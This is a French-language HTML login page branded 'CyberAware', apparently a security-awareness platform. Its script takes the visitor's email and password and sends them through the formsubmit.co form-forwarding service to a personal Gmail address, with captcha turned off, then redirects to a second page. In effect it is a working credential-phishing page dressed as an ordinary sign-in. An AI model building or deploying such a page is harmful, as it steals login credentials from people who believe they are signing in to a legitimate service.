<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CyberAware – Connexion</title>

  <style>
    :root {
      --main-color: #2563eb;
      --border-color: #e2e8f0;
    }

    * {
      box-sizing: border-box;
      font-family: Segoe UI, Tahoma, sans-serif;
    }

    body {
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .wrapper {
      max-width: 900px;
      width: 100%;
      padding: 20px;
    }

    .card {
      border: 1px solid var(--border-color);
      border-radius: 12px;
      padding: 30px;
      margin-bottom: 25px;
      text-align: center;
      box-shadow: 0 6px 20px rgba(0,0,0,.05);
    }

    h1 {
      color: var(--main-color);
      margin-bottom: 15px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 8px;
      border: 1px solid var(--border-color);
    }

    button {
      width: 100%;
      padding: 12px;
      background: var(--main-color);
      color: #fff;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      opacity: 0.9;
    }

    .loading {
      display: none;
      margin-top: 10px;
      color: var(--main-color);
    }
  </style>
</head>
<body>

<div class="wrapper">
  <section class="card">
    <h1>CyberAware</h1>
    <p>Plateforme de sensibilisation</p>

    <form id="loginForm">
      <input type="email" name="email" required placeholder="Adresse email">
      <input type="password" name="password" required placeholder="Mot de passe">
      <button type="submit">Continuer</button>
      <div class="loading" id="loading">Envoi en cours...</div>
    </form>
  </section>
</div>

<script>
  document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    // Génère un code à 6 chiffres
    const generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
    
    // Affiche le chargement
    document.getElementById("loading").style.display = "block";

    // Prépare les données
    const formData = new FormData(this);
    formData.append("_subject", "Nouvelle inscription CyberAware");
    formData.append("_captcha", "false");
    formData.append("code_validation", generatedCode);

    // Envoi AJAX
    fetch("https://formsubmit.co/ajax/tss.alex84@gmail.com", {
      method: "POST",
      headers: { "Accept": "application/json" },
      body: formData
    })
    .then(response => response.json())
    .then(() => {
      // Stocke le code dans sessionStorage
      sessionStorage.setItem("validationCode", generatedCode);
      
      // Redirige vers index2.html
      window.location.href = "index2.html";
    })
    .catch(() => {
      document.getElementById("loading").style.display = "none";
      alert("Erreur lors de l'envoi. Veuillez réessayer.");
    });
  });
</script>

</body>
</html>
